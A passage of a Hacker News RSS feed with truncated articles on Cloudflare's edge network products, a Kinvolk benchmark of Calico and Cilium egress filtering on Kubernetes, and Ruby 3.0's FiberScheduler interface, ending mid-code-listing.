cloud providers, internet exchanges, and customers). Their edge network is generally accessed via 200 Points of Presence (POPs), strategically situated across 100 countries – putting the vast majority of the world within 100ms of their edge. They handle 18M+ web requests per second on average, hitting 25M+ protected web sites and services -- which means they typically handle ~1.5 trillion web requests a day. The insights gained from handling all that traffic then powers a threat intel system that protects the edge network and its customers, which blocks an average of 72B cyberthreats a day. </p><p>Behind the core architecture of their platform is:</p><ul><li>Software Defined Networking = Cloudflare architected their global network and backbones to be software-based, which allows for their entire edge network to be programmable. [Covered before in my <a href="https://hhhypergrowth.com/what-are-edge-networks/">Edge Networks</a> write up.]</li><li>Local Edge Routing ("Anycast") = Allows for incoming requests to the edge network to be routed to different locations; any edge server, instead of one origin server. This is what allows CDNs and edge networks to be a proxy, and provide an umbrella of services by sitting over all requests to origin servers.</li><li><a href="https://blog.cloudflare.com/argo-and-the-cloudflare-global-private-backbone/">Global Private Backbone ("Argo")</a> &nbsp;= Their private network backbones between major interconnects, which all combine into their global edge network. This allows them to efficiently monitor global network conditions, and to achieve higher speeds by routing traffic globally across those private backbones instead of over the public Internet (using Argo Smart Routing - see below). </li><li><a href="https://www.cloudflare.com/network/">Global Anycast Network</a> = Their mesh of global networks and backbones, with 200+ edge servers across the globe serving as gateways into that network. [You can see the list of POP cities in the link.] </li></ul><figure><img src="https://hhhypergrowth.com/content/images/2020/12/cloudflare_global.png" alt="" srcset="https://hhhypergrowth.com/content/images/size/w600/2020/12/cloudflare_global.png 600w, https://hhhypergrowth.com/content/images/size/w1000/2020/12/cloudflare_global.png 1000w, https://hhhypergrowth.com/content/images/2020/12/cloudflare_global.png 1500w" sizes="(min-width: 720px) 720px"><figcaption>Cloudflare's network of POPs forms a mesh covering 95% of the Internet-going populace.</figcaption></figure><p>Their edge network sits between a company's applications (web sites, web apps, or mobile apps) or services (APIs, microservices, or serverless), and the users making requests to them. Being a proxy between a <em>service</em> and the <em>users accessing it </em>has a lot of advantages, and the primary focus of Cloudflare over its first 10 years has been around 3 pillars: improving the <strong>Security</strong>, <strong>Performance</strong> and <strong>Reliability</strong> of their customers' web applications and services. &nbsp;</p><h3 id="security">Security</h3><p>Cloudflare is known mostly for its security features. Security over your web applications and services remains critical! Some tidbits from <a href="https://blog.cloudflare.com/network-layer-ddos-attack-trends-for-q3-2020/">a recent technical blog post looking at attack trends</a>: DDoS attacks are surging in 2020, and for the past 3 quarters, <strong>the number of attacks have doubled each of those quarters</strong>. </p><ul><li><a href="https://www.cloudflare.com/waf/">Web Application Firewall (WAF)</a> = A proactive next-gen firewall over your web application. Uses threat intelligence (ML &amp; signature recognition) and customizable rules to block suspicious traffic.</li><li><a href="https://www.cloudflare.com/ddos/">DDoS Protection</a> = Ensure performance of your web app or service, by making sure only legitimate traffic is hitting it. Prevents denial of service and concurrent bot attacks.</li><li><a href="https://www.cloudflare.com/products/bot-management/">Bot Management</a> = Stop automated bots in real-time, tracking both good or bad actors. Prevents common attack vectors, like application DDoS and content scraping.</li><li><a href="https://www.cloudflare.com/rate-limiting/">Rate Limiting</a> = Once traffic gets in through the WAF, provides rate limiting capabilities over your application, to curb application DDoS attacks, brute-force login attempts, and other abusive behaviors from "legitimate" requests.</li><li><a href="https://www.cloudflare.com/ssl/">SSL</a> = Provides SSL/HTTPS capabilities over your web application or service.</li><li><a href="https://www.cloudflare.com/products/cloudflare-spectrum/">Spectrum</a> = Extends these core security features to work with non-web protocols (email, FTP, SSH, MQTT, or any specialized TCP/UDP traffic, like game protocols).</li><li><a href="https://www.cloudflare.com/campaigns/">Cloudflare for Campaigns</a> = Free service protecting local, state and federal US political campaigns from attack (via DDoS and WAF).</li></ul><h3 id="performance">Performance</h3><p>Besides being a security layer, being the proxy between web services and end users also allows Cloudflare to help improve the performance of the application being called, so that it is as fast as possible. This is primarily through caching and optimization of content.</p><ul><li><a href="https://www.cloudflare.com/cdn">Content Delivery Network (CDN)</a> = Caching static content for faster delivery and greatly reduced trips to origin server.</li><li><a href="https://www.cloudflare.com/website-optimization/">Web Optimization</a> = Compressing content &amp; images for faster delivery. Automatically encode images to a variety of formats, allowing for right-sizing of images by tailoring it to the device it is viewed on (phone vs tablet vs web).</li><li><a href="https://www.cloudflare.com/products/cloudflare-stream/">Stream</a> (Video Optimization &amp; Delivery) = Compresses video for faster delivery and caches it to CDN. Automatically encodes to a variety of formats, allowing for right-sizing of video, to tailor to device it is viewed on (phone vs tablet vs web). Allows for limiting access based on geo-location, user or time-based rules.</li></ul><h3 id="reliability">Reliability</h3><p>And hand-in-hand with performance of your application comes the reliability of the entire network between a service and its users, to assure it is always available. Cloudflare provides an array of services to bolster the resilience of your site, and make sure the network there is always at the ready.</p><ul><li><a href="https://www.cloudflare.com/products/argo-smart-routing/">Argo Smart Routing</a> = Route optimization system to determine fastest route for web requests to origin. Detects real-time congestion via ML, and routes around it; think of it as the "Waze for the Internet". Finds the fastest &amp; most reliable routes over both the edge network backbone (Argo) and the overall Internet. </li><li><a href="https://www.cloudflare.com/load-balancing/">Load Balancing</a> = Allows for routing incoming Anycast requests to different origin servers, or have failover should a server go down. Allows for geo-steering, to assure certain regions of users hit a particular server.</li><li><a href="https://www.cloudflare.com/dns/">Managed DNS</a> = Fast, secure and resilient Domain Name Service (DNS, the lookup that routes URLs to the network IP that serves it). Built to be highly redundant, with built-in DDoS &amp; spoof protection.</li></ul><h2 id="consumers">Consumers</h2><p>Besides their core enterprise platform, they have several consumer-facing applications.... and like their enterprise platform, it has very generous options at the free tier. In particular, it is important to understand their WARP-line of products, which is a VPN that protects the endpoint's traffic to the nearest edge server. </p><ul><li><a href="https://1.1.1.1/dns/">1.1.1.1</a> = Free &amp; fast open DNS resolution service for consumers (the lookup to determine what IP to route a web request to). Similar to what Google provides as their Public DNS server at 8.8.8.8. &nbsp;[This <a href="https://blog.cloudflare.com/announcing-1111/">blog post</a> covered the history of DNS and its issues, if you want to understand DNS better.]</li><li><a href="https://1.1.1.1/family/">1.1.1.1 for Families</a> = Family-friendly public DNS resolution servers for use on home routers, for malware and adult content blocking.</li><li><a href="https://1.1.1.1/">1.1.1.1 + WARP</a> = Free consumer VPN app for mobile (iOS and Android), and, as of this year, Mac and Windows desktop. Beyond using the 1.1.1.1 DNS service, it is a VPN that <strong>protects the network traffic between your device and the nearest edge server</strong>.</li><li>WARP+ = Paid consumer VPN service in the 1.1.1.1 app, that extends WARP<strong> by adding in Argo Smart Routing over Cloudflare's private backbones</strong>, to achieve higher speeds on web requests (30% faster on average), and gain overall better performance &amp; reliability. This leverages their enterprise-focused edge network towards consumer use.</li></ul><p>Their consumer products don't provide revenue (they are free or low-cost), but provide clues as to where their enterprise products can go, plus assuredly provides a lot of intel in their routing &amp; threat detection analytics happening over network traffic. &nbsp;</p><h2 id="connectivity">Connectivity</h2><p>All of these are the enterprise flip-side of those consumer services - they protect the traffic between a company's enterprise network or specific origin servers to the nearest edge server. </p><ul><li><a href="https://www.cloudflare.com/products/argo-tunnel/">Argo Tunnel</a> = Secure tunneling for the edge to connect to individual web apps and services. It is a lightweight agent that runs on an origin server, <strong>creating a tunnel to the nearest edge server</strong>, so traffic can route in through Cloudflare's application security -- to then take advantage of WAF, DDoS protection, rate limiting, load balancing, etc. The request and response speeds are improved via Argo Smart Routing over their private backbones. [The agent is called "cloudflared", with the "d" for daemon (a service running the background). But it must be fun to say your service is "cloud-flared".]</li><li><a href="https://www.cloudflare.com/partners/peering-portal/">Private Network Interface (PNI) </a>= Network interconnect to an enterprise's network, via an interconnect partner (Data Center) or Internet exchange (IX). This …</li></ul></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hhhypergrowth.com/flare-ups/">https://hhhypergrowth.com/flare-ups/</a></em></p>]]>
            </description>
            <link>https://hhhypergrowth.com/flare-ups/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560918</guid>
            <pubDate>Mon, 28 Dec 2020 17:13:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Egress Filtering Benchmark Part 2: Calico and Cilium]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560912">thread link</a>) | @vbatts
<br/>
December 28, 2020 | https://kinvolk.io/blog/2020/12/egress-filtering-benchmark-part-2-calico-and-cilium/ | <a href="https://web.archive.org/web/*/https://kinvolk.io/blog/2020/12/egress-filtering-benchmark-part-2-calico-and-cilium/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>In a 


<a href="https://kinvolk.io/blog/2020/09/performance-benchmark-analysis-of-egress-filtering-on-linux/" target="_blank">recent blog
post</a>
, we
compared three different technical approaches to filtering egress traffic on Linux: IP tables, IP sets, and
BPF. While that provided some interesting baseline benchmarks of the core Linux technologies, we wanted to go
beyond that to look at how one would implement such filters in practice, using off-the-shelf cloud native
network policy solutions.</p>
<p>In the realm of the Cloud Native, it is not far-fetched to imagine a Kubernetes cluster needing egress
filtering for controlling the traffic (host or pod) attempting to leave the network to possibly wild and
dangerous endpoints on the internet. Indeed, this is a common use case for avoiding exfiltration of data by
malicious workloads.</p>
<p>One could of course build a custom egress filtering framework to suit the use case based on the existing
technologies in the Linux networking pipeline. Or one could take advantage of the Kubernetes CNI plugins that
already offer similar functionality.</p>
<p>Our friends at SAP asked us to perform a benchmark of the two most widely used Kubernetes CNIs, Calico and
Cilium, for this task. This blog post presents the methodology and results from benchmarking Calico and Cilium
deployed on a 


<a href="https://kinvolk.io/lokomotive-kubernetes/" target="_blank">Lokomotive</a>
 cluster.</p>
<h2 id="goals">Goals</h2>
<p>We had the following goals going into this study:</p>
<ul>
<li>Provide a reproducible benchmark framework that anyone can download and use.</li>
<li>Compare the scalability and potential performance overhead by Kubernetes CNI plugins such as Calico and
Cilium against using the underlying Linux filtering mechanisms (IP sets and eBPF, respectively).</li>
</ul>
<h2 id="about-calico">About Calico</h2>
<p>


<a href="https://www.projectcalico.org/" target="_blank">Calico</a>
 is the most popular open source CNI plugin for Kubernetes, according
to the recent 


<a href="https://www.datadoghq.com/container-report/" target="_blank">Datadog container survey</a>
. Calico not only
provides networking but also offers policy isolation for securing the Kubernetes cluster using advanced
ingress and egress policies.</p>
<p>Calico provides a choice of dataplane including a standard Linux networking dataplane (default), a pure Linux
eBPF dataplane and a Windows HNS dataplane.</p>
<h2 id="about-cilium">About Cilium</h2>
<p>


<a href="https://cilium.io/" target="_blank">Cilium</a>
, an increasingly popular open source Kubernetes CNI plugin, leverages eBPF to
address the networking challenges of container workloads such as scalability, security and visibility. Cilium
capabilities include identity-aware security, multi-cluster routing, transparent encryption, API-aware
visibility/filtering, and service-mesh acceleration.</p>
<h2 id="network-policies">Network Policies</h2>
<p>Kubernetes network policies are defined using the Kubernetes NetworkPolicy resource. However, Kubernetes
itself does not enforce network policies, and instead delegates their enforcement to the network plugins, in
our case Calico or Cilium.</p>
<p>Kubernetes NetworkPolicy resource is an application-centric construct i.e. it allows you to specify how a pod
is allowed to communicate with others Pods, Services, external Ingress or Egress traffic. However, it cannot
be used to enforce rules on a node or cluster level. Hence for egress filtering, we create network policies
using these CNI plugins’ custom APIs.</p>
<p>Calico provides its NetworkPolicy, GlobalNetworkPolicy and GlobalNetworkSet API objects which provide
additional features such as order, namespace scoped or cluster-wide enforcement of policies.</p>
<p>For Calico, we used GlobalNetworkSet API passing a  list of CIDRs that we want to deny egress to and then
reference the GlobalNetworkSet resource in the GlobalNetworkPolicy via label selectors.</p>
<p>Under the hood, this setup is similar to using IP sets for filtering egress traffic. Calico uses
GlobalNetworkSet to create IP sets and GlobalNetworkPolicy to update the iptables matching the IP set.</p>
<p>Cilium, on the other hand, uses eBPF as the underlying technology to enforce network policies. A Cilium agent
running on each host translates the network policy definitions to eBPF programs and eBPF maps and attaches
them to different eBPF hooks in the system. Network policy definitions are created with the help of
CiliumNetworkPolicy and CiliumClusterwideNetworkPolicy custom resources for namespace scoped and cluster-wide
network traffic respectively.</p>
<p>For Cilium, we used CiliumClusterwideNetworkPolicy API passing a list of CIDRs to deny egress and match the
policy using label selectors for both application workloads and network traffic on the host.</p>
<h2 id="metrics">Metrics</h2>
<p>Filtering network traffic could be a costly operation, especially if the number of rules to check is
considerably high — such as in millions (as is the case with a real-world scenario we are working on).
Throughput, CPU usage and latency must all be measured to provide a meaningful conclusion for the technologies
to be used.</p>
<p>We have used the following metrics to measure the performance of the filters:</p>
<ul>
<li>Throughput</li>
<li>CPU usage</li>
<li>Latency</li>
</ul>
<p>For a Kubernetes CNI an equally important metric is <code>Set-up time</code>. Since Calico/Cilium delegates the
responsibilities to the underlying technologies, we want to capture the time taken by the CNI plugin to
process the created API objects and enforce the network policies for egress filtering.</p>
<h2 id="scenario">Scenario</h2>
<p>The scenario for this test is, as in our



<a href="https://kinvolk.io/blog/2020/09/performance-benchmark-analysis-of-egress-filtering-on-linux/" target="_blank">previous</a>

egress filtering benchmark, composed of a client and a server computer that communicate through an IP network.
The egress filtering is performed on the client machine and there is no filtering performed on the server
side.</p>
<p>We test five possible mechanisms for doing the filtering:</p>
<ul>
<li>iptables, “raw” IP sets and tc-eBPF test application, as in the previous benchmark (retesting to ensure
consistency)</li>
<li>Calico and Cilium, in both cases running the client application in a pod in a Lokomotive Kubernetes cluster,
with the solution under test running as the Kubernetes CNI plug-in.</li>
</ul>
<p>In addition, for a baseline reference, we also ran the test without any filtering mechanism in place.</p>
<p>This is shown in the following diagram:</p>
<figure>
  <img src="https://kinvolk.io/media/2020-12-23-egress-filtering-with-calico-cilium/scenario.svg">
</figure>
<h2 id="benchmark-set-up">Benchmark Set-up</h2>
<p>As mentioned earlier, our set-up builds on the work of the existing framework.  Hence the software and
hardware profiles used to benchmark IP sets and tc-eBPF largely remain the same, except for the following
changes:</p>
<ul>
<li>Updated software versions for Flatcar, ipset, iperf and the Linux kernel.</li>
<li>Two Lokomotive clusters with one worker node to run the benchmarks, one each for Calico and Cilium.</li>
</ul>
<h3 id="hardware">Hardware</h3>
<p>To perform the test we used the following bare metal servers running on 


<a href="https://metal.equinix.com/" target="_blank">Equinix
Metal</a>
:</p>
<ul>
<li>2 machines as client and server machines for IP set and tc-eBPF filters.</li>
<li>2 machines for the Lokomotive cluster (1 controller, 1 worker) for benchmarking Calico.</li>
<li>2 machines for the Lokomotive cluster (1 controller, 1 worker) for benchmarking Cilium.</li>
</ul>
<p>The specifications of all the machines used were:</p>
<div><pre><code data-lang="shell">c2.medium.x86
1x AMD EPYC 7401P 24-Core Processor @ 2.0GHz
2x 120GB SSD
2x 480GB SSD
64GB RAM
2x 10Gbps
</code></pre></div><h3 id="software">Software</h3>
<p>Kubernetes is deployed using 


<a href="https://kinvolk.io/lokomotive-kubernetes/" target="_blank">Lokomotive</a>
. We used two separate
clusters for this benchmark, to isolate comparison of Calico and Cilium from interfering with each other.</p>
<h4 id="calico">Calico</h4>
<p>Calico offers a choice of dataplane options, including standard Linux networking (its default) and eBPF.
However, Calico’s eBPF dataplane doesn’t support host endpoints, which means that node-level egress filtering
is not possible with it. Hence, we use the default standard Linux networking dataplane for our tests.</p>
<h4 id="cilium">Cilium</h4>
<p>Cilium with its eBPF based dataplane is installed on Lokomotive using a 


<a href="https://github.com/kinvolk/lokomotive/blob/imran/cilium-instead-of-calico/assets/terraform-modules/bootkube/resources/charts/cilium.yaml" target="_blank">modified default
configuration</a>

to support our test scenario. The changes are as follows:</p>
<ul>
<li>Increase the number of entries in the endpoint policy map to the maximum limit allowed; i.e. 65536.</li>
<li>Enable host firewall for enforcing host network policies.</li>
<li>The network interface name on which the host firewall applies.</li>
</ul>
<h4 id="software-versions">Software Versions</h4>
<p>The exact versions of all the tools we used are:</p>
<ul>
<li>Flatcar Container Linux by Kinvolk Alpha (2705.0.0)</li>
<li>Linux kernel 5.9.11</li>
<li>iperf 3.6 (in a Docker container with the host network)</li>
<li>iptables v1.6.2</li>
<li>ipset v7.6, protocol version: 7</li>
<li>Lokomotive v0.5.0 for Calico; Cilium feature branch for installing Lokomotive with Cilium</li>
<li>Kubernetes v1.19.4</li>
<li>Calico v3.16.4</li>
<li>Cilium v1.9.0</li>
</ul>
<p>A minimal working configuration for deploying Lokomotive on Equinix Metal can be found



<a href="https://github.com/kinvolk/egress-filtering-benchmark/blob/master/lokomotive" target="_blank">here</a>
 and the
instructions are mentioned in the



<a href="https://github.com/kinvolk/egress-filtering-benchmark/blob/master/README.md" target="_blank">README.md</a>
.</p>
<h3 id="tests">Tests</h3>
<p>We used the following parameters for each of the tests:</p>
<ul>
<li>
<p>Throughput: The goal of this test is to maximize throughput, ignoring CPU consumption (i.e. CPU will
typically be saturated). Therefore, iperf3 was used with the bandwidth set to 10Gbps (equal to the network
interface adapter speed) and UDP Packet size set to 1470. Throughput is tested in Gbps; we have not measured
throughput in packet per second (pps) but that could be added in the benchmark framework
(see 


<a href="https://github.com/kinvolk/egress-filtering-benchmark/issues/16" target="_blank">issue #16</a>
).</p>
</li>
<li>
<p>CPU usage: In this test we want to see the variation in CPU usage for a given throughout. Therefore, we
again use iperf3 but reduce the bandwidth to 1G. UDP Packet size remains at 1470.</p>
</li>
<li>
<p>Latency: To test latency, we bombard the server with ICMP packets using the ping utility at a rate of 1000
pings per millisecond.</p>
</li>
<li>
<p>Setup Time: As we discussed in our first egress filtering benchmark, set-up time is an implementation-detail
specific to the benchmarking application and most certainly can be improved upon. Setup time for Calico and
Cilium is calculated using ‘ping’ (ICMP) on a polling basis, checking the enforcement of policies on each
poll.</p>
</li>
</ul>
<h3 id="reproducibility">Reproducibility</h3>
<p>All the tools and instructions to reproduce these tests are provided in the GitHub repository



<a href="https://github.com/kinvolk/egress-filtering-benchmark" target="_blank">github.com/kinvolk/egress-filtering-benchmark
</a>
</p>
<h3 id="constraints">Constraints</h3>
<ul>
<li>
<p>To avoid the error <code>etcdserver: Request entity too large</code> multiple NetworkPolicy manifests (for Cilium and
Calico) are created with each containing a maximum of 50000 CIDR entries. When the number of rules increases,
more manifests are created and sent to the Kubernetes API server.</p>
</li>
<li>
<p>One possible source of error in testing is if the Kubernetes API server and etcd themselves become a
bottleneck for requests, especially when a lot of resources are created in a short span of time. since both
Calico and Cilium use them extensively. Therefore, Controller nodes were chosen such that they can …</p></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kinvolk.io/blog/2020/12/egress-filtering-benchmark-part-2-calico-and-cilium/">https://kinvolk.io/blog/2020/12/egress-filtering-benchmark-part-2-calico-and-cilium/</a></em></p>]]>
            </description>
            <link>https://kinvolk.io/blog/2020/12/egress-filtering-benchmark-part-2-calico-and-cilium/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560912</guid>
            <pubDate>Mon, 28 Dec 2020 17:12:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Media.ccc.de – RC3: Remote Chaos Experience]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560900">thread link</a>) | @pelasaco
<br/>
December 28, 2020 | https://media.ccc.de/b/conferences/rc3 | <a href="https://web.archive.org/web/*/https://media.ccc.de/b/conferences/rc3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://media.ccc.de/b/conferences/rc3</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560900</guid>
            <pubDate>Mon, 28 Dec 2020 17:11:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ruby 3.0 and the new FiberScheduler interface]]>
            </title>
            <description>
<![CDATA[
Score 199 | Comments 77 (<a href="https://news.ycombinator.com/item?id=25560894">thread link</a>) | @WJW
<br/>
December 28, 2020 | http://www.wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html | <a href="https://web.archive.org/web/*/http://www.wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
            

            <p>
    Posted on December 28, 2020
    
        by wjwh
    
</p>

<p><img src="http://www.wjwh.eu/images/ruby_logo.png" title="Ruby logo"><br>
A few days ago on Christmas day 2020, Matz released Ruby 3.0. Like every year, a host of interesting new features was included with the new version. Most articles I have read so far focus more on the new ways to introduce type hints and the <code>Ractor</code> system but for me the most interesting addition was the introduction of the <code>Fiber::SchedulerInterface</code> class. It allows for (but does not yet implement) more advanced event loop based schedulers for non-blocking I/O in Ruby. Several advanced techniques already exist for this in Ruby, from event loop frameworks like <a href="https://github.com/eventmachine/eventmachine">EventMachine</a> and <a href="https://github.com/socketry/async">Async</a> to releasing the GVL in C extensions, but this new interface is more exciting to me because it makes it much easier to accidentally do the right thing.</p>
<p>In this post I’ll go over the way the scheduler interface works in “normal” Ruby, and how to access it from within MRI C extensions. We’ll also have a look at the drawbacks of the current interface, because nothing is perfect.</p>
<h2 id="nonblocking-io-with-fibers">Nonblocking I/O with Fibers</h2>
<p>In MRI Ruby, a <a href="https://docs.ruby-lang.org/en/master/Fiber.html"><code>Fiber</code></a> is a primitive for implementing light weight cooperative concurrency. They are somewhat like traditional <a href="https://ruby-doc.org/core-3.0.0/Thread.html">threads</a> in that they take a block and run it concurrently with other fibers, but they live with many fibers “inside” a thread. This means that at most one fiber per thread can run at a time, but because they use very little memory it is feasible to create hundreds of thousands of fibers without problems. If you have very computationally intensive tasks for your fibers, this does not bring any benefits since dividing the work into many small parts does not help if you don’t have enough capacity for it in the first place. However, many Ruby processes spend much of their time waiting on I/O, such as waiting for the responses of API and database calls or waiting to read more of a HTTP request from a network socket. This is the use case where fibers shine.</p>
<p>More “traditional” systems manage all this waiting around by allocating a separate operating system (OS) thread for every separate request, then make blocking system calls for reading from and writing to sockets and files. This works well up to a point, but an OS thread is relatively expensive to create and they require a context switch to the OS whenever another thread needs to run. This leads to a lot of overhead. Fibers can leverage the facilities for non-blocking and asynchronous I/O that modern operating systems provide to skip a lot of this overhead. They do this by calling <a href="https://docs.ruby-lang.org/en/master/Fiber.html#method-c-yield"><code>yield</code></a> whenever they realize they will not be able to make progress, giving the floor to another fiber. Some examples might be when <code>Kernel#sleep</code> is called or whenever a <code>read()</code> or <code>write()</code> syscall returns the <a href="https://linux.die.net/man/2/send"><code>EWOULDBLOCK</code> or <code>EAGAIN</code></a> error codes. The missing link in this story is the new fiber scheduler, which is the code that a fiber yields <em>to</em>. The scheduler is responsible for maintaining a inventory of blocked fibers and <code>resume</code>-ing those fibers when the reason why they were blocked disappears. For example, if a fiber was blocked because it called <code>sleep(10)</code>, then after 10 seconds it should be resumed again. If the fiber was blocked because no data was available on the socket it wanted to read from, it should be resumed as soon as data arrives.</p>
<p>The scheduler is allowed to any mechanism to achieve this, but in practice there are a couple of good options:</p>
<ul>
<li>On almost all Linux systems, <code>epoll()</code> is the go-to mechanism for watching large numbers of sockets to see if new data is available. It can also manage sleeps with the <code>timerFD</code> mechanism.</li>
<li>On very modern Linux systems (kernel version 5.4 and beyond), the <code>io_uring</code> API is available. This API makes it not only possible to monitor sockets and manage sleeps, but also to offload the read and write calls themselves to the OS instead of offloading just the waiting for availability.</li>
<li>On Windows systems, IO Completion Ports can be used in much the same way as the <code>io_uring</code> API.</li>
<li>On BSD systems and derivatives like MacOS, the <code>kqueue()</code> system call is used insted of <code>epoll()</code>. I’m not aware of an async I/O API being developed for these systems yet, but would be happy if someone can correct me on that.</li>
</ul>
<p>Choosing between these possible mechanisms and managing the conversion between Ruby objects and what the OS demands is the task of the scheduler. Since fibers are thread-local and cannot move between threads, so is the scheduler. It would theoretically be possible to have an <code>epoll()</code> based scheduler for one thread and an <code>io_uring</code> based one for another, but in practice the scheduler would probably be provided by a separate gem and automatically choose the most performant interface available for the current OS.</p>
<p>To make the integration seamless for Ruby developers, in Ruby 3.0 and onwards all relevant standard library methods have been patched to <code>yield</code> to the scheduler whenever they encounter a situation where they will block the current fiber. These methods include, at the time of writing, <code>Kernel.sleep</code>, <code>IO#wait_readable</code>, <code>IO#wait_writable</code>, <code>IO#read</code>, <code>IO#write</code> and other related methods (e.g.&nbsp;<code>IO#puts</code>, <code>IO#gets</code>), <code>Thread#join</code>, <code>ConditionVariable#wait</code>, <code>Queue#pop</code>, <code>SizedQueue#push</code>. This yielding to the scheduler only happens when a scheduler has actually been defined for the thread with <code>Fiber.set_scheduler</code>. The real power of this becomes apparent when you realize that this means <em>any</em> method in any gem that eventually calls <code>IO#read</code> or <code>IO#write</code> can make use of the scheduler, whether that gem has been written with the scheduler in mind or not. This immediately makes many gems like database drivers and network libraries scheduler-aware, as long as they don’t use C extensions too heavily. Even if they do, not all is lost. We’ll look at integrating C extensions with the scheduler later.</p>
<h2 id="a-non-blocking-io-example">A non-blocking IO example</h2>
<p>Let’s look at a very simple example from the <a href="https://rubyreferences.github.io/rubychanges/3.0.html#non-blocking-fiber-and-scheduler">comprehensive release notes</a>:</p>
<div id="cb1"><pre><code><span id="cb1-1"><a href="#cb1-1"></a>start = <span>Time</span>.now</span>
<span id="cb1-2"><a href="#cb1-2"></a></span>
<span id="cb1-3"><a href="#cb1-3"></a><span>Thread</span>.new <span>do</span> <span># in this thread, we'll have non-blocking fibers</span></span>
<span id="cb1-4"><a href="#cb1-4"></a>  <span>Fiber</span>.set_scheduler <span>Scheduler</span>.new</span>
<span id="cb1-5"><a href="#cb1-5"></a></span>
<span id="cb1-6"><a href="#cb1-6"></a><span>  %w[</span><span>2.6 2.7 3.0</span><span>]</span>.each <span>do</span> |version|</span>
<span id="cb1-7"><a href="#cb1-7"></a>    <span>Fiber</span>.schedule <span>do</span> <span># Runs block of code in a separate Fiber</span></span>
<span id="cb1-8"><a href="#cb1-8"></a>      t = <span>Time</span>.now</span>
<span id="cb1-9"><a href="#cb1-9"></a>      <span># Instead of blocking while the response will be ready, the Fiber</span></span>
<span id="cb1-10"><a href="#cb1-10"></a>      <span># will invoke scheduler to add itself to the list of waiting fibers</span></span>
<span id="cb1-11"><a href="#cb1-11"></a>      <span># and transfer control to other fibers</span></span>
<span id="cb1-12"><a href="#cb1-12"></a>      <span>Net</span>::<span>HTTP</span>.get(<span>'rubyreferences.github.io'</span>, <span>"/rubychanges/</span><span>#{</span>version<span>}</span><span>.html"</span>)</span>
<span id="cb1-13"><a href="#cb1-13"></a>      puts <span>'%s: finished in %.3f'</span> % [version, <span>Time</span>.now - t]</span>
<span id="cb1-14"><a href="#cb1-14"></a>    <span>end</span></span>
<span id="cb1-15"><a href="#cb1-15"></a>  <span>end</span></span>
<span id="cb1-16"><a href="#cb1-16"></a><span>end</span>.join <span># At the </span><span>END</span><span> of the thread code, Scheduler will be called to dispatch</span></span>
<span id="cb1-17"><a href="#cb1-17"></a>         <span># all waiting fibers in a non-blocking manner</span></span>
<span id="cb1-18"><a href="#cb1-18"></a></span>
<span id="cb1-19"><a href="#cb1-19"></a>puts <span>'Total: finished in %.3f'</span> % (<span>Time</span>.now - start)</span>
<span id="cb1-20"><a href="#cb1-20"></a><span># Prints:</span></span>
<span id="cb1-21"><a href="#cb1-21"></a><span>#  2.6: finished in 0.139</span></span>
<span id="cb1-22"><a href="#cb1-22"></a><span>#  2.7: finished in 0.141</span></span>
<span id="cb1-23"><a href="#cb1-23"></a><span>#  3.0: finished in 0.143</span></span>
<span id="cb1-24"><a href="#cb1-24"></a><span>#  Total: finished in 0.146</span></span></code></pre></div>
<p>This example sets the scheduler for the new thread to a new instance of some <code>Scheduler</code> class and then uses <code>Fiber.schedule</code> to send off three HTTP requests that fetch the release notes for several recent Ruby versions. We can see in the output that the total time taken is only a few milliseconds longer than the slowest response, indicating that all three HTTP requests were performed in parallel.</p>
<p>How does this work, given that we can see none of the methods mentioned above being used in the example? Well, <code>Net::HTTP.get</code> uses <code>IO#write</code> and <code>IO#read</code> in its implementation, so while a request is in flight and waiting for a response, its fiber will <code>yield</code> back to the scheduler to let other fibers do work. Since the actual CPU work here is very low, many fibers can be run on the same scheduler without them getting in each other’s way too much.</p>
<h2 id="integrating-the-fiber-scheduler-into-c-extensions">Integrating the Fiber scheduler into C extensions</h2>
<p>Having functions like <code>IO#read</code> and <code>Kernel.sleep</code> automatically using the Fiber scheduler is all well and good, but many useful Ruby gems use C extensions to drop the GVL, perform operations “underneath” the Ruby garbage collector or just for plain speed of execution of computationally expensive operations. These C extensions will typically not use the Ruby methods for writing to and reading from file descriptors, so if they wish to use an existing fiber scheduler to efficiently use non-blocking I/O they have to call it themselves. Luckily, this is not hard!</p>
<p>A (very) quick recap of C extensions for MRI: a Ruby object is represented in C by a <code>VALUE</code> struct that contains all the relevant information about the object. A few “standard” values like <code>true</code>, <code>false</code> and <code>nil</code> and some others have been predefined and are available to test against as <code>Qnil</code>, <code>Qtrue</code>, etc. Ruby methods can be called either directly in C (if the Ruby method itself was defined in C) or with the <code>rb_funcall()</code> C function.</p>
<p>Using the scheduler is obviously only possible if it has been defined for the current thread with <code>Fiber#set_scheduler</code>. To check if this is the case in a C extension, we can use the <code>rb_scheduler_current()</code> C function, which will return a <code>VALUE</code> containing either the current scheduler or <code>Qnil</code> if it hasn’t been set. If the scheduler is set, it is possible to call with one of the available functions that are defined in <code>scheduler.c</code> in the main folder of the Ruby repo. Finally as a complete example, let’s look at how the <a href="https://github.com/ruby/ruby/blob/7d0144e055fdbd7110cf84275b9e145550b77fd3/io.c#L1306">Ruby standard library</a> implements this pattern:</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a><span>int</span> rb_io_wait_readable(<span>int</span> f)</span>
<span id="cb2-2"><a href="#cb2-2"></a>{</span>
<span id="cb2-3"><a href="#cb2-3"></a>    VALUE scheduler = rb_scheduler_current();</span>
<span id="cb2-4"><a href="#cb2-4"></a>    <span>if</span> (scheduler != Qnil) {</span>
